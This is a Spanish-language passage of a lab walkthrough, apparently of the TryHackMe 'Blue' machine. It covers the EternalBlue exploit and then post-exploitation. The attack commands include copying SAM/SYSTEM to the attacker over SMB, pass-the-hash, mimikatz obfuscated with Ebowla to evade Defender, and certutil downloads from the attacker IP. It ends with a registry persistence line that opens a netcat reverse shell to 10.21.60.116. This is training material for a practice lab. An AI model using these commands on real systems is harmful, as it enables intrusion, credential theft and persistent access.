-<li><p><strong>meterpreter shell o regular cmd</strong>: Visto con metasploit, con meterpreter permite hacer algunas cosas extras automátizadas, mas ejecucción en memoria…</p>
-</li>
-<li><p><strong>staged payload o stageless payload</strong>: El payload con etapas tiene la primera parte más pequeña y hace más difícil detectarlo, necesita conexión a internet para descargar el resto, mientras que el payload sin etapas va todo de golpe, puede ser más fácil de detectar. Nosotros utilizaremos este porque vamos a usar netcat para establecer la conexión y no esta preparado para múltiples fases con intercambio de información.</p>
-</li>
-</ul>
-<p>Nos ponemos por escucha con una terminal por el puerto indicado:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> rlwrap nc -nlvp 8888</span><br></pre></td></tr></table></figure></div>
-
-<p>Con rlwrap podemos realizar acciones como ctrl+L y más.</p>
-<p>Ejecutamos el <strong>eternalblue_exploit7.py</strong>:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 eternalblue_exploit7.py 10.10.244.238 shellcode/sc_x64.bin</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/whoami_en_victima.png"
-                      alt="Ejecucción del comando whoami en la máquina víctima."
-                ><figcaption>Ejecucción del comando whoami en la máquina víctima.</figcaption></figure></p>
-<p>Cómo podéis comprobar no siempre es un camino de rosas, te vas a encontrar muchas trabas, si en el exploit de python(zzz_exploit.py) visto anteriormente hubiera salido algún pipe poniendo el usuario <strong>guest</strong> tendríamos que haber modificado el script para que en lugar de escribir un archivo en C: se conectará a un recurso compartido mediante smb creado por nosotros para ejecutar un binario netcat.exe para proporcionarnos la reverse shell. Quién quiera entrar más en detalle de cómo realizar en este <a class="link"   href="https://www.youtube.com/watch?v=92XycxcAXkI" >vídeo de s4ivtar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> lo explica, minutos 57:00-1:01:19.</p>
-<h1 id="Post-explotacion"><a href="#Post-explotacion" class="headerlink" title="Post explotación"></a>Post explotación</h1><h2 id="Activar-el-usuario-Administrator"><a href="#Activar-el-usuario-Administrator" class="headerlink" title="Activar el usuario Administrator"></a>Activar el usuario Administrator</h2><p>En está máquina tenemos desactivados el usuario Administrator, podríamos hacer lo mismo con guest, pero no nos va a hacer falta:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user Administrator /active:yes</span><br><span class="line"><span class="built_in">net</span> user Administrator Administrator</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Copia-del-archivo-SAM-y-SYSTEM"><a href="#Copia-del-archivo-SAM-y-SYSTEM" class="headerlink" title="Copia del archivo SAM y SYSTEM"></a>Copia del archivo SAM y SYSTEM</h2><ul>
-<li><p><strong>SAM</strong>(Security Account Manager): Base de datos que almacena las credenciales de los usuarios del sistema.</p>
-</li>
-<li><p><strong>SYSTEM</strong>: Parte del registro que contiene información crítica para del sistema y claves de cifrado útiles para descifrar los hashes del archivo SAM.</p>
-</li>
-</ul>
-<p>Nos podemos dirigir al directorio <strong>C:\Windows\Temp</strong>, crear una carpeta y hacer una copia de estos archivos:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\system system.backup</span><br><span class="line">reg save HKLM\sam sam.backup</span><br></pre></td></tr></table></figure></div>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/saves_reg_sam_system.png"
-                      alt="Copia de SAM y SYSTEM."
-                ><figcaption>Copia de SAM y SYSTEM.</figcaption></figure></p>
-<p>A continuación nos lo vamos a transferir por smb hacía nuestro equipo.</p>
-<h2 id="Enlaces-simbolicos-para-impacket"><a href="#Enlaces-simbolicos-para-impacket" class="headerlink" title="Enlaces simbólicos para impacket"></a>Enlaces simbólicos para impacket</h2><p>Para compartir recursos mediante SMB desde nuestro equipo Arch vamos a utilizar <strong>Impacket</strong>, pero en mi caso, al estar en arch y intentar ejecutar el binario me pone que no es encontrado y si esta instalado(pacman -S impacket), al parecer los binarios son almacenados sin indicar <strong>impacket-</strong> al principo como otros sistemas operativos(ej: Kali Linux) en la ruta &#x2F;usr&#x2F;bin&#x2F; Bien, pues he encontrado un <a class="link"   href="https://github.com/NoobGajen/impacket-Symbolic-link-for-Arch-Linux-as-Kali-Linux/blob/master/impacket-Symbolic-link-for-Arch-Linux-as-Kali-Linux.sh" >script realizado por NoobGajen<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que se encarga de crear enlaces símbolicos en dicho directorio por cada paquete de impacket instalado en la misma ruta &#x2F;usr&#x2F;bin.</p>
-<p>Script:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if impacket or python-impacket-git is installed and get the package name</span></span><br><span class="line">package=$(pacman -Qs | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -E <span class="string">&#x27;^local/impacket$|^local/python-impacket-git$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the package variable is non-empty (i.e., a matching package is found)</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$package</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[32m<span class="subst">$(basename $package local/)</span>\033[0m package found installed in your system:)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;Now, creating symbolic link for impacket binaries...\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the list of binaries for the package and create symbolic links</span></span><br><span class="line">    binaries=$(pacman -Ql <span class="variable">$package</span> | grep -i <span class="string">&#x27;/usr/bin/[A-Za-z0-9._-]\+&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> binary <span class="keyword">in</span> <span class="variable">$binaries</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">ln</span> -sfv <span class="string">&quot;<span class="variable">$binary</span>&quot;</span> <span class="string">&quot;/usr/bin/impacket-<span class="subst">$(basename <span class="string">&quot;<span class="variable">$binary</span>&quot;</span> .py)</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;Impacket is not installed in your Arch Linux.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>
-
-<p>Le damos permisos de ejecucción y lanzamos.<br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/creacion_symbolic_links_impacket.png"
-                      alt="Creación de los links simbólicos."
-                ><figcaption>Creación de los links simbólicos.</figcaption></figure></p>
-<p>Con reiniciar la terminal o cerrarla y abrir otra ya podemos utilizarlo el comando con el formato <strong>impacket-…</strong></p>
-<h2 id="Transferencia-de-archivos-mediante-smb"><a href="#Transferencia-de-archivos-mediante-smb" class="headerlink" title="Transferencia de archivos mediante smb"></a>Transferencia de archivos mediante smb</h2><p>Utilizamos la herramienta <strong>impacket-smbserver</strong> para que la víctima nos vea y nos pueda mandar los archivos:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-smbserver smbFolder $(<span class="built_in">pwd</span>) -smb2support</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><p><strong>impacket-smbserver</strong>: Herramienta que nos permite crear un servidor smb.</p>
-</li>
-<li><p><strong>smbFolder</strong>: nombre del recurso compartido.</p>
-</li>
-<li><p><strong>$(pwd)</strong>: Directorio que queremos compartir</p>
-</li>
-<li><p><strong>smb2support</strong>: Compatible para los clientes que utilicen smb2.</p>
-</li>
-</ul>
-<p>Acto consecutivo en la shell de la víctima vamos a copiar estos archivos a mi equipo mediante smb:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> sam.backup \\<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>\smbFolder\sam</span><br><span class="line"><span class="built_in">copy</span> system.backup \\<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>\smbFolder\system</span><br></pre></td></tr></table></figure></div>
-
-<p>Y el resultado sería el siguiente:<br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/mandar_sam_system_victima_atacante_via_smb.png"
-                      alt="Mandar via smb los archivos sam y system."
-                ><figcaption>Mandar via smb los archivos sam y system.</figcaption></figure><br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/recibir_sam_system_atacante_impacket_smb.png"
-                      alt="Recibir los archivos sam y system."
-                ><figcaption>Recibir los archivos sam y system.</figcaption></figure></p>
-<p>Al tener estos archivos ya en nuestro equipo podemos utilizar <strong>impacket-secretdump</strong> que nos devolverá los hashes de los usuarios:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam -system system LOCAL</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/hashes_volcados_con_impacket_secretsdump.png"
-                      alt="Obtención de hashes con impacket-secretsdump."
-                ><figcaption>Obtención de hashes con impacket-secretsdump.</figcaption></figure></p>
-<p>Estos hashes los puedes intentar de romper como hemos visto antes con metasploit, mediante crackstation, hashcat…</p>
-<h2 id="Informacion-extra-y-conexion-con-el-usuario-Administrator-mediante-Pass-The-Hash"><a href="#Informacion-extra-y-conexion-con-el-usuario-Administrator-mediante-Pass-The-Hash" class="headerlink" title="Información extra y conexión con el usuario Administrator mediante Pass The Hash"></a>Información extra y conexión con el usuario Administrator mediante Pass The Hash</h2><p>Imaginaros que la contraseña de Administrator(que la hemos puesto nosotros) es muy complicada y no conseguimos sacar el hash, podemos realizar <strong>pass the hash</strong>, está técnica consiste en conectarse utilizando el hash ntlm en lugar de la contraseña, para ello vamos a utilizar netexec(cómo crackmapexec) para comprobar si esto es posible:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec 10.10.110.244 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><strong>-H</strong>: Hash(en este caso NTLM)</li>
-</ul>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/netexec_pass_the_hash.png"
-                      alt="Intento fallido de pass the hash."
-                ><figcaption>Intento fallido de pass the hash.</figcaption></figure></p>
-<p>Obtener hashes de contraseña almacenados en memoria, secretos como contraseñas de cuentas.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.91.251 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;31d6cfe0d16ae931b73c59d7e0c089c0&#x27;</span> --lsa</span><br></pre></td></tr></table></figure></div>
-
-<p>No vemos nada interesante.<br><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/netexec_administrator_lsa_secrets.png"
-                      alt="Resultado de los secretos."
-                ><figcaption>Resultado de los secretos.</figcaption></figure></p>
-<p>Para entrar al sistema con el usuario Administrador sería:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap impacket-psexec WORKGROUP/Administrator@10.10.145.252 -hashes :d144986c6122b1b1654ba39932465528</span><br></pre></td></tr></table></figure></div>
-
-<p>Y así podríamos entrar solo teniendo el hash.</p>
-<p>El siguiente paso es utilizar <strong>Mimikatz</strong> para intentar extraer las credenciales de Administrator de la memoria en texto claro. En una auditoría real, se puede llegar a comprometer un equipo con cuentas no privilegiadas, pero con mimikatz algunas veces se pueden ver contraseñas de usuarios privilegiados en memoria.</p>
-<h2 id="Mimikatz-y-ofuscacion-con-Ebowla-para-evadir-el-defender"><a href="#Mimikatz-y-ofuscacion-con-Ebowla-para-evadir-el-defender" class="headerlink" title="Mimikatz y ofuscación con Ebowla para evadir el defender"></a>Mimikatz y ofuscación con Ebowla para evadir el defender</h2><p>En este caso nos lo descargamos del siguiente <a class="link"   href="https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe" >repositorio<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, recuerda que tiene que ser .exe para transferirlo a la máquina víctima.</p>
-<p>Pero antes de transferir nada, tenemos que asegurarnos de que el antivirus(el defender) no nos lo casque, para ello vamos a utilizar <a class="link"   href="https://github.com/Genetic-Malware/Ebowla" >Ebowla<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que nos ofusca el archivo y se desencripta con las variables de entorno de la víctima. Está un poco desactualizado y puede que con los nuevos antivirus o algunos más complejos no funcione, pero para este caso nos sirve.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Genetic-Malware/Ebowla</span><br><span class="line"></span><br><span class="line"><span class="comment"># Movemos el mimikatz dentro del directorio Ebowla</span></span><br><span class="line"><span class="built_in">mv</span> mimikatz.exe Ebowla</span><br></pre></td></tr></table></figure></div>
-
-<p>Nos dirigimos dentro del directorio Ebowla y abrimos el archivo <strong>genetic.config</strong>.</p>
-<p>Una vez dentro vamos a modificar los siguientes valores:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/ebowla_genetic_config_output_payload_type_modification.png"
-                      alt="Modificación de la variable output_type y payload_type."
-                ><figcaption>Modificación de la variable output_type y payload_type.</figcaption></figure></p>
-<p>Ahora vamos un poco en el script hasta que estemos en [[ENV_VAR]] que es la chicha.</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/ebowla_genetic_config_env_var_vacio.png"
-                      alt="Variables de entorno por defecto."
-                ><figcaption>Variables de entorno por defecto.</figcaption></figure></p>
-<p>Hay que tener cuidado a la hora de rellenarlo, porque si nos equivocamos en alguna luego el binario no se va interpretar bien y no se podrá descrifrar correctamente.</p>
-<p>Para ir rellenándolas tendremos que ir a la consola víctima y ir viendo el valores de estas variables de entorno.</p>
-<p>Para ver las variables de entorno en windows tenemos el comando: <strong>echo %variable_entorno%</strong>, cuando no reporta nada mejor no se pone nada, es mejor que no intentéis buscarlo de otra forma porque a lo mejor no lo interpreta correctamente.</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/ebowla_genetic_config_env_var_completado.png"
-                      alt="Variables de entorno rellenadas."
-                ><figcaption>Variables de entorno rellenadas.</figcaption></figure></p>
-<p>Guardamos, cerramos, instalamos las siguientes dependencias para que el script funcione:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2-configobj python2-pyparsing</span><br></pre></td></tr></table></figure></div>
-
-<p>Ejecutamos el script:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 ebowla.py mimikatz.exe genetic.config</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/ebowla_go_mimikatz.png"
-                      alt="Creación del archivo mimikatz con go que será compilado."
-                ><figcaption>Creación del archivo mimikatz con go que será compilado.</figcaption></figure></p>
-<p>Si vemos lo que hay en el directorio output que nos ha creado, veremos el archivo go_symmetric_mimikatz.exe.go. Tenemos el script <strong>build_x64_go.sh</strong> que se va a encargar de compilar nuestro archivo:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./build_x64_go.sh output/go_symmetric_mimikatz.exe.go mimikatz.exe</span><br></pre></td></tr></table></figure></div>
-
-<p>Al ejecutar el script vemos que algo no ha ido bien, que novedad eh, arch y sus cosas. En este caso dice lo siguiente entre otras líneas:</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgo: C compiler &quot;x86_64-w64-mingw32-gcc&quot; not found: exec: &quot;x86_64-w64-mingw32-gcc&quot;: executable file not found in $PATH</span><br></pre></td></tr></table></figure></div>
-<p>Nada pues lo instalamos <strong>sudo pacman -S mingw-w64-gcc</strong> y volvemos a ejecutar el comando:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/ebowla_script_bash_go_compila_mimikatz.png"
-                      alt="Compilación final de mimikatz."
-                ><figcaption>Compilación final de mimikatz.</figcaption></figure></p>
-<p>Bien, ya nos lo ha creado en el directorio output, vamos a transferir el archivo, en esta ocasión con un servidor en python:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>
-
-<p>Y en la máquina víctima nos lo descargamos con certutil:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil.exe -f -urlcache -split http://<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>/mimikatz.exe</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><strong>certutil.exe</strong>: Herramienta nativa de Windows que permite administrar certificados y claves criptográficas. En nuestro caso abusamos de él para descargar archivos de internet.</li>
-<li><strong>-f</strong>: Sobreescribe un archivo si ya existe.</li>
-<li><strong>-urlcache</strong>: Para descargar archivos.</li>
-<li><strong>split</strong>: Divide el archivo en muchas partes y luego lo reensambla. Útil para manejar archivos grandes o redes inestables.</li>
-</ul>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/mimikatz_in_victim_machine.png"
-                      alt="Mimikatz descargado en la máquina víctima."
-                ><figcaption>Mimikatz descargado en la máquina víctima.</figcaption></figure></p>
-<p>Si probamos a ejecutar el programa nos sale lo siguiente:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/preview_mimikatz_victim_machine.png"
-                      alt="Mimikatz en la máquina víctima."
-                ><figcaption>Mimikatz en la máquina víctima.</figcaption></figure></p>
-<p>Ahora en la consola interactiva de mimikatz ponemos lo siguiente:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><strong>privilege::debug</strong>: Elevamos los privilegios del proceso que esta ejecutando Mimikatz. Intenta habilitar el privlegio SeDebugPrivilege en el proceso para poder inspeccionar y manipular la memoria de otros procesos.</li>
-<li><strong>sekurlsa::logonPasswords</strong>: Extrae la información de autenticación de la memoria, específicamente de LSASS(Local Security Authority Sybsystem Service). Nos puede mostrar contraseñas en texto claro, hashes NLTM, Tickets de Kerberos, información sobre sesiones de usuarios activas.</li>
-</ul>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/mimikatz_results_without_passwords.png"
-                      alt="Resultados de mimikatz sin contraseña."
-                ><figcaption>Resultados de mimikatz sin contraseña.</figcaption></figure></p>
-<p>En este caso no nos muestra credenciales en texto claro, pero podría ser que lo hiciera.</p>
-<h2 id="Informacion-extra"><a href="#Informacion-extra" class="headerlink" title="Información extra"></a>Información extra</h2><h3 id="LaZagne-Stealer-de-contrasenas"><a href="#LaZagne-Stealer-de-contrasenas" class="headerlink" title="LaZagne Stealer de contraseñas."></a>LaZagne Stealer de contraseñas.</h3><p>Dejo comentado por aquí que tenemos la herramienta <strong><a class="link"   href="https://github.com/AlessandroZ/LaZagne" >LaZagne<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> que nos permite recolectar credenciales almacenadas en nuestro equipo(navegador, gestores de contraseñas, tokens…).</p>
-<h2 id="Activacion-y-conexion-sobre-RDP"><a href="#Activacion-y-conexion-sobre-RDP" class="headerlink" title="Activación y conexión sobre RDP"></a>Activación y conexión sobre RDP</h2><p>Podemos comprobar si la máquina víctima tiene el servicio RDP disponible:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p3389 --open -v -n 10.10.145.252</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/port_rdp_nmap_scan.png"
-                      alt="Comprobación del puerto RDP."
-                ><figcaption>Comprobación del puerto RDP.</figcaption></figure></p>
-<p>Al estar cerrado tendríamos que utilizar <strong>netexec</strong> para activar el rdp en la máquina víctima:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.145.252 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;d144986c6122b1b1654ba39932465528&#x27;</span> -M rdp -o action=<span class="built_in">enable</span></span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><strong>-M rdp</strong>: Indicamos el módulo RDP.</li>
-<li><strong>-o action&#x3D;enable</strong>: -o Nos permite pasarle opciones al módulo seleccionado, en este caso que active rdp en caso de que no este.</li>
-</ul>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/active_rdp_with_netexec.png"
-                      alt="Activando rdp con netexec."
-                ><figcaption>Activando rdp con netexec.</figcaption></figure></p>
-<p>Otro tip es que ya que tenemos acceso al equipo víctima, podemos comprobar si dicho puerto se ha abierto con el comando:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -na</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><strong>-n</strong>: Muestra las direcciones ip y los números de puerto en formato numérico. Sin está opción también intentaría resolver el nombre de los host y tardaría más tiempo.</li>
-<li><strong>-a</strong>: Muestra todas las conexiones y puertos activos.</li>
-</ul>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/netstat_open_port.png"
-                      alt="Comprobación del estado del puerto rdp en la máquina víctima."
-                ><figcaption>Comprobación del estado del puerto rdp en la máquina víctima.</figcaption></figure></p>
-<p>Ejecucción de la conexión para obtener el escritorio:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop 10.10.145.252 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;no_la_tengo&#x27;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>Si no tienes la contraseña puedes usar <strong>xfreerdp</strong> para usar pass the hash, en arch tienes que instalar el paquete AUR:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S freerdp2</span><br></pre></td></tr></table></figure></div>
-
-<p>Después ya lo puedes ejecutar con <strong>xfreerdp</strong>:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.10.202.55 /u:Administrator /pth:d144986c6122b1b1654ba39932465528 /sec:rdp</span><br></pre></td></tr></table></figure></div>
-
-<p>En W7 no podemos aplicar pass the hash porque necesitamos tener el modo restricted Admin Mode activado, esto solo es posible a partir del Windows 8.1, lo podemos ver en la ayuda del comando xfreerdp si aún así quieres intentarlo verás que no se conecta al usuario Administrator, si no que tienes que introducir la contraseña:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/hash_the_pass_rdp_w7_not_allowed.png"
-                      alt="Hash the pass en Windows 7 no permitido."
-                ><figcaption>Hash the pass en Windows 7 no permitido.</figcaption></figure></p>
-<p>Así que tenemos que seguir buscando una manera para buscar la contraseña sin llegar a descifrar el hash.</p>
-<p>Lo que podemos hacer es entrar mediante RDP(ya que la contraseña se la hemos establecido nosotros) con las credenciales Administrator&#x2F;Administrator, <strong>simulando la conexión de un tercero</strong>. Una vez realizado esto realizamos las mismas operaciones con mimikatz y vemos si aparece algo más de información.</p>
-<p>La idea es ejecutar los comandos del mimikatz una vez conectado por RDP(en mi caso lo he realizado mientras está la conexión activa)</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/conexion_mediante_rdp_sabiendo_la_contrase%C3%B1a.png"
-                      alt="Conexión simulando un tercero."
-                ><figcaption>Conexión simulando un tercero.</figcaption></figure></p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/mimikatz_con_credenciales_administrator.png"
-                      alt="Mimikatz con las credenciales del administrador en texto claro."
-                ><figcaption>Mimikatz con las credenciales del administrador en texto claro.</figcaption></figure></p>
-<p>Genial, ahora si podemos ver la contraseña en texto claro, hashes…En caso de ser una contraseña compleja os la podríais encontrar mediante mimikatz y ser de gran ayuda.</p>
-<h1 id="Persistencia"><a href="#Persistencia" class="headerlink" title="Persistencia"></a>Persistencia</h1><h2 id="1-Cuando-se-abre-una-aplicacion-que-nos-de-una-shell"><a href="#1-Cuando-se-abre-una-aplicacion-que-nos-de-una-shell" class="headerlink" title="1. Cuando se abre una aplicación que nos de una shell."></a>1. Cuando se abre una aplicación que nos de una shell.</h2><p>Cada vez que se abra el explorador de archivos vamos a obtener una shell, lo primero es buscar el binario o nombre de este:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\system32</span><br><span class="line"><span class="built_in">dir</span> | <span class="built_in">find</span> &quot;explore&quot;</span><br></pre></td></tr></table></figure></div>
-
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/encontrado_el_binario_del_explorador_de_archivos.png"
-                      alt="Binario del explorador de archivos."
-                ><figcaption>Binario del explorador de archivos.</figcaption></figure></p>
-<p>Una vez localizado(explorer.exe) debemos realizar una copia:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> explorer.exe _explorer.exe</span><br></pre></td></tr></table></figure></div>
-
-<p>Debemos de subir un binario netcat, para que pueda enviarnos la shell:</p>
-<p>Nos lo descargamos en nuestro máquina atacante, en mi caso utilice este <a class="link"   href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe" >repositorio<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> y una vez traido a mi máquina lo renombre como nc.exe.</p>
-<p>Nos movemos a la carpeta creada en temp aunque no haría falta porque somos Administradores, pero al estar ya creada.</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\Temp\postExplotacion</span><br></pre></td></tr></table></figure></div>
-
-<p>Y de la misma forma que nos descargamos mimikatz lo hacemos con nc, en este caso no vamos a utilizar ebowla porque el firewall no lo detecta y no hace falta.</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line">certutil -f -urlcache -<span class="built_in">split</span> http://10.21.60.116/nc.exe</span><br></pre></td></tr></table></figure></div>
-
-<p>Una vez descargado vamos a añadir el siguiente registro:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe&quot; /v Debugger /t reg_sz /d &quot;<span class="built_in">cmd</span> /C _explorer.exe &amp; C:\Windows\Temp\postExplotacion\nc.exe -e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> <span class="number">443</span>&quot; /f </span><br></pre></td></tr></table></figure></div>
-
-<p>En caso de equivocarte con algo para eliminarlo sería así:</p>
